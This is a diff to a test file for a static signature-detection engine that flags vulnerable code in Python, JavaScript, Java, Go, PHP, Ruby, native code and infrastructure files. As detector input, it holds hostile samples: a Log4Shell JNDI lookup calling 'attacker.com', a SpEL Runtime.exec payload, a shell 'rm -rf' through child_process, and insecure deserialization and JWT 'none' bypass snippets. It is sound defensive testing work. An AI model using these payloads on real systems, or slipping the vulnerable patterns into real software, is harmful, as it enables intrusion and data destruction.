@@ -1,12 +1,13 @@
 /**
- * Regression tests for the signature registry (#527).
+ * Tests for the expanded signature registry (#527, #668).
  *
- * Two defects are covered here:
- *   1. `rotateSignatures()` used to `clear()` the live map before registering
- *      the replacements, so one malformed entry left the shared engine with a
- *      partial or empty database and every later scan quietly matched nothing.
- *   2. A pattern carrying the `g`/`y` flag made `test()` stateful, so the same
- *      signature alternated between matching and not matching the same payload.
+ * Covers:
+ *   1. Stateless compilation and validation of dynamic signatures.
+ *   2. Atomic rotation and batch updates preventing database corruption.
+ *   3. Multi-language security signatures: Python, JS/TS, Java, Go, PHP, Ruby, Rust/C++, Docker/IaC.
+ *   4. Framework-specific exploit signatures: Django, Flask, Express, Next.js, Spring, Laravel, Rails.
+ *   5. Filtering and search capabilities by language, framework, category, and severity.
+ *   6. Dynamic fingerprinting risk calculation and zero-day exploit identification.
  */
 import { describe, it, expect, beforeEach } from "vitest";
 import {
@@ -16,6 +17,17 @@ import {
   validateSignature,
   type PayloadSignature,
 } from "./fingerprint";
+import {
+  EXPANDED_SIGNATURE_REGISTRY,
+  getSignaturesByLanguage,
+  getSignaturesByFramework,
+  getSignaturesByCategory,
+  getSignaturesBySeverity,
+  searchSignatures,
+  loadRegistryIntoEngine,
+  exportSignatureCatalogSummary,
+  type ExtendedPayloadSignature,
+} from "./signature-registry";
 
 const sig = (over: Partial<PayloadSignature> = {}): PayloadSignature => ({
   id: "SIG-TEST-001",
@@ -263,5 +275,306 @@ describe("DynamicFingerprintEngine stateless matching", () => {
       "eval(atob('x')); __proto__['a']= ; UNION SELECT; ghp_" + "a".repeat(36),
     );
     expect(res.riskScore).toBeLessThanOrEqual(100);
+  });
+});
+
+describe("Expanded Signature Registry Catalog and Multi-Language Detection", () => {
+  let engine: DynamicFingerprintEngine;
+
+  beforeEach(() => {
+    engine = new DynamicFingerprintEngine();
+    loadRegistryIntoEngine(engine);
+  });
+
+  it("validates that all curated signatures are valid and compile cleanly", () => {
+    expect(EXPANDED_SIGNATURE_REGISTRY.length).toBeGreaterThanOrEqual(20);
+
+    for (const signature of EXPANDED_SIGNATURE_REGISTRY) {
+      const issues = validateSignature(signature, signature.id);
+      expect(issues).toEqual([]);
+      expect(signature.cweIds?.length).toBeGreaterThan(0);
+      expect(signature.owaspCategories?.length).toBeGreaterThan(0);
+      expect(signature.remediationGuidance).toBeDefined();
+    }
+  });
+
+  it("filters signatures by programming language", () => {
+    const pySignatures = getSignaturesByLanguage("python");
+    expect(pySignatures.length).toBeGreaterThanOrEqual(4);
+    expect(pySignatures.every((s) => s.targetLanguages?.includes("python"))).toBe(true);
+
+    const jsSignatures = getSignaturesByLanguage("javascript");
+    expect(jsSignatures.length).toBeGreaterThanOrEqual(4);
+
+    const javaSignatures = getSignaturesByLanguage("java");
+    expect(javaSignatures.length).toBeGreaterThanOrEqual(3);
+
+    const goSignatures = getSignaturesByLanguage("go");
+    expect(goSignatures.length).toBeGreaterThanOrEqual(2);
+
+    const phpSignatures = getSignaturesByLanguage("php");
+    expect(phpSignatures.length).toBeGreaterThanOrEqual(3);
+
+    const rbSignatures = getSignaturesByLanguage("ruby");
+    expect(rbSignatures.length).toBeGreaterThanOrEqual(2);
+
+    const rustSignatures = getSignaturesByLanguage("rust");
+    expect(rustSignatures.length).toBeGreaterThanOrEqual(1);
+
+    const dockerSignatures = getSignaturesByLanguage("dockerfile");
+    expect(dockerSignatures.length).toBeGreaterThanOrEqual(1);
+  });
+
+  it("filters signatures by web framework", () => {
+    const djangoSigs = getSignaturesByFramework("django");
+    expect(djangoSigs.length).toBeGreaterThanOrEqual(3);
+
+    const springSigs = getSignaturesByFramework("spring");
+    expect(springSigs.length).toBeGreaterThanOrEqual(3);
+
+    const expressSigs = getSignaturesByFramework("express");
+    expect(expressSigs.length).toBeGreaterThanOrEqual(3);
+
+    const laravelSigs = getSignaturesByFramework("laravel");
+    expect(laravelSigs.length).toBeGreaterThanOrEqual(2);
+
+    const railsSigs = getSignaturesByFramework("rails");
+    expect(railsSigs.length).toBeGreaterThanOrEqual(2);
+  });
+
+  it("filters signatures by category and severity", () => {
+    const rceSigs = getSignaturesByCategory("RCE");
+    expect(rceSigs.length).toBeGreaterThanOrEqual(5);
+
+    const critSigs = getSignaturesBySeverity("CRITICAL");
+    expect(critSigs.length).toBeGreaterThanOrEqual(8);
+  });
+
+  it("searches signatures by keyword across metadata and description", () => {
+    const pickleResults = searchSignatures("pickle");
+    expect(pickleResults.length).toBeGreaterThanOrEqual(1);
+    expect(pickleResults[0].id).toBe("SIG-PY-001");
+
+    const log4jResults = searchSignatures("log4shell");
+    expect(log4jResults.length).toBeGreaterThanOrEqual(1);
+    expect(log4jResults[0].id).toBe("SIG-JAVA-001");
+
+    const cwe78Results = searchSignatures("CWE-78");
+    expect(cwe78Results.length).toBeGreaterThanOrEqual(2);
+  });
+
+  it("exports an accurate catalog summary", () => {
+    const summary = exportSignatureCatalogSummary();
+    expect(summary.totalSignatures).toBe(EXPANDED_SIGNATURE_REGISTRY.length);
+    expect(summary.languages).toContain("python");
+    expect(summary.languages).toContain("javascript");
+    expect(summary.languages).toContain("java");
+    expect(summary.languages).toContain("go");
+    expect(summary.frameworks).toContain("spring");
+    expect(summary.frameworks).toContain("django");
+    expect(summary.version).toBe("1.1.0");
+  });
+
+  it("detects Python insecure deserialization and command injection", () => {
+    const pickleRes = engine.analyzePayload(
+      "repo",
+      "handlers/worker.py",
+      "InsecureDeserialization",
+      "import pickle\ndata = pickle.loads(raw_user_input)",
+    );
+    expect(pickleRes.matchedSignatures.some((s) => s.id === "SIG-PY-001")).toBe(true);
+    expect(pickleRes.isZeroDayDetected).toBe(true);
+
+    const osSystemRes = engine.analyzePayload(
+      "repo",
+      "scripts/deploy.py",
+      "CommandInjection",
+      "import subprocess\nsubprocess.Popen(f'ping {host}', shell=True)",
+    );
+    expect(osSystemRes.matchedSignatures.some((s) => s.id === "SIG-PY-002")).toBe(true);
+  });
+
+  it("detects Python Jinja2 SSTI and Django raw SQL interpolation", () => {
+    const sstiRes = engine.analyzePayload(
+      "repo",
+      "views.py",
+      "SSTI",
+      "return render_template_string(f'Hello {name}')",
+    );
+    expect(sstiRes.matchedSignatures.some((s) => s.id === "SIG-PY-003")).toBe(true);
+
+    const djangoSqlRes = engine.analyzePayload(
+      "repo",
+      "models.py",
+      "SQLi",
+      "User.objects.raw(f'SELECT * FROM users WHERE id = {user_id}')",
+    );
+    expect(djangoSqlRes.matchedSignatures.some((s) => s.id === "SIG-PY-004")).toBe(true);
+  });
+
+  it("detects Node.js dynamic child_process, VM injection, and JWT none algorithm", () => {
+    const childProcRes = engine.analyzePayload(
+      "repo",
+      "server.ts",
+      "RCE",
+      "child_process.exec(`rm -rf ${userPath}`);",
+    );
+    expect(childProcRes.matchedSignatures.some((s) => s.id === "SIG-JS-001")).toBe(true);
+
+    const vmRes = engine.analyzePayload(
+      "repo",
+      "sandbox.js",
+      "VM_Escape",
+      "vm.runInNewContext(userCode, sandbox);",
+    );
+    expect(vmRes.matchedSignatures.some((s) => s.id === "SIG-JS-002")).toBe(true);
+
+    const jwtNoneRes = engine.analyzePayload(
+      "repo",
+      "auth.ts",
+      "AuthBypass",
+      "const decoded = jwt.verify(token, null, { algorithms: ['none'] });",
+    );
+    expect(jwtNoneRes.matchedSignatures.some((s) => s.id === "SIG-JS-004")).toBe(true);
+  });
+
+  it("detects React dangerouslySetInnerHTML and SSRF fetch patterns", () => {
+    const xssRes = engine.analyzePayload(
+      "repo",
+      "Component.tsx",
+      "XSS",
+      "<div dangerouslySetInnerHTML={{ __html: `<b>${userBio}</b>` }} />",
+    );
+    expect(xssRes.matchedSignatures.some((s) => s.id === "SIG-JS-003")).toBe(true);
+
+    const ssrfRes = engine.analyzePayload(
+      "repo",
+      "proxy.ts",
+      "SSRF",
+      "const resp = await fetch(req.query.targetUrl);",
+    );
+    expect(ssrfRes.matchedSignatures.some((s) => s.id === "SIG-JS-005")).toBe(true);
+  });
+
+  it("detects Java Log4Shell and Spring Expression Language (SpEL) injection", () => {
+    const log4jRes = engine.analyzePayload(
+      "repo",
+      "App.java",
+      "Log4Shell",
+      "logger.info('User: ' + '${jndi:ldap://attacker.com/payload}');",
+    );
+    expect(log4jRes.matchedSignatures.some((s) => s.id === "SIG-JAVA-001")).toBe(true);
+
+    const spelRes = engine.analyzePayload(
+      "repo",
+      "SpelService.java",
+      "RCE",
+      "String exp = 'T(java.lang.Runtime).getRuntime().exec(\"id\")';",
+    );
+    expect(spelRes.matchedSignatures.some((s) => s.id === "SIG-JAVA-002")).toBe(true);
+  });
+
+  it("detects Go exec.Command shell invocation and InsecureSkipVerify", () => {
+    const goExecRes = engine.analyzePayload(
+      "repo",
+      "main.go",
+      "RCE",
+      "cmd := exec.Command(\"sh\", \"-c\", fmt.Sprintf(\"cat %s\", filePath))",
+    );
+    expect(goExecRes.matchedSignatures.some((s) => s.id === "SIG-GO-001")).toBe(true);
+
+    const goTlsRes = engine.analyzePayload(
+      "repo",
+      "client.go",
+      "TLS",
+      "tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}",
+    );
+    expect(goTlsRes.matchedSignatures.some((s) => s.id === "SIG-GO-002")).toBe(true);
+  });
+
+  it("detects PHP unsafe unserialize and Laravel raw query builder injection", () => {
+    const phpUnserializeRes = engine.analyzePayload(
+      "repo",
+      "session.php",
+      "InsecureDeserialization",
+      "$data = unserialize($_POST['session_token']);",
+    );
+    expect(phpUnserializeRes.matchedSignatures.some((s) => s.id === "SIG-PHP-001")).toBe(true);
+
+    const laravelSqlRes = engine.analyzePayload(
+      "repo",
+      "UserController.php",
+      "SQLi",
+      "DB::raw('SELECT * FROM users WHERE status = ' . $status);",
+    );
+    expect(laravelSqlRes.matchedSignatures.some((s) => s.id === "SIG-PHP-003")).toBe(true);
+  });
+
+  it("detects Ruby unsafe YAML deserialization and Rails permit! bypass", () => {
+    const yamlRes = engine.analyzePayload(
+      "repo",
+      "config_loader.rb",
+      "RCE",
+      "obj = YAML.load(File.read(path))",
+    );
+    expect(yamlRes.matchedSignatures.some((s) => s.id === "SIG-RB-001")).toBe(true);
+
+    const permitRes = engine.analyzePayload(
+      "repo",
+      "users_controller.rb",
+      "MassAssignment",
+      "user.update(params.permit!)",
+    );
+    expect(permitRes.matchedSignatures.some((s) => s.id === "SIG-RB-002")).toBe(true);
+  });
+
+  it("detects native C strcpy and Rust mem::transmute usage", () => {
+    const strcpyRes = engine.analyzePayload(
+      "repo",
+      "buffer.c",
+      "BufferOverflow",
+      "strcpy(destBuffer, userSource);",
+    );
+    expect(strcpyRes.matchedSignatures.some((s) => s.id === "SIG-NATIVE-001")).toBe(true);
+
+    const rustTransmuteRes = engine.analyzePayload(
+      "repo",
+      "mem.rs",
+      "UnsafePointer",
+      "let val: &Target = std::mem::transmute(source_ptr);",
+    );
+    expect(rustTransmuteRes.matchedSignatures.some((s) => s.id === "SIG-RUST-001")).toBe(true);
+  });
+
+  it("detects Dockerfile and Kubernetes infrastructure vulnerabilities", () => {
+    const dockerRes = engine.analyzePayload(
+      "repo",
+      "Dockerfile",
+      "SecretLeak",
+      "ENV AWS_SECRET_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE",
+    );
+    expect(dockerRes.matchedSignatures.some((s) => s.id === "SIG-IAC-001")).toBe(true);
+
+    const k8sRes = engine.analyzePayload(
+      "repo",
+      "cluster-rbac.yaml",
+      "RBAC",
+      "kind: ClusterRoleBinding\nroleRef:\n  name: cluster-admin",
+    );
+    expect(k8sRes.matchedSignatures.some((s) => s.id === "SIG-IAC-002")).toBe(true);
+  });
+
+  it("supports selective registry loading into engine by language and category", () => {
+    const customEngine = new DynamicFingerprintEngine();
+    const count = loadRegistryIntoEngine(customEngine, {
+      languages: ["python"],
+      categories: ["RCE"],
+      version: "2.0.0",
+    });
+
+    expect(count).toBeGreaterThanOrEqual(2);
+    expect(customEngine.getActiveVersion()).toBe("2.0.0");
+    const activeSignatures = customEngine.getSignatures();
+    expect(activeSignatures.some((s) => s.id === "SIG-PY-001")).toBe(true);
   });
 });
